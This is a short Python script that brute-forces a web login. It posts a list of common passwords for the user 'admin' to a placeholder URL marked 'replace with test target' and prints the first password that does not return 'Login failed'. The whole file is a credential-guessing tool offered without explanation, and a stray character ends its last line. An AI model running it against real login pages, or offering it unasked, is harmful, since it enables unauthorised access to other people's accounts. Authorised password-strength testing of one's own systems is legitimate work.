import requests

url = "http://example.com/login"  # replace with test target
username = "admin"

passwords = ["1234", "admin", "password", "admin123"]

for password in passwords:
    data = {
        "username": username,
        "password": password
    }

    response = requests.post(url, data=data)

    if "Login failed" not in response.text:
        print(f"[SUCCESS] Password found: {password}")
        break
    else:
        print(f"[FAILED] {password}")m